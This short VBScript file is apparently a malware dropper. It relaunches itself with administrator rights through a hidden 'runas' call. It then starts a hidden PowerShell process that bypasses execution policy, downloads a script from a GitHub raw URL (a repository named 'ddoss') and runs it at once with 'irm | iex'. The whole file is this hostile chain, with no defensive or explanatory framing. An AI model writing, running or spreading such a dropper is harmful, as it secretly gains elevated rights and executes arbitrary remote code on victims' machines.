Set objShell = CreateObject("Shell.Application")
If Not WScript.Arguments.Named.Exists("elevate") Then
    objShell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevate", "", "runas", 0
    WScript.Quit
End If

CreateObject("Wscript.Shell").Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""irm 'https://raw.githubusercontent.com/srap18/ddoss/main/1122' | iex""", 0, False
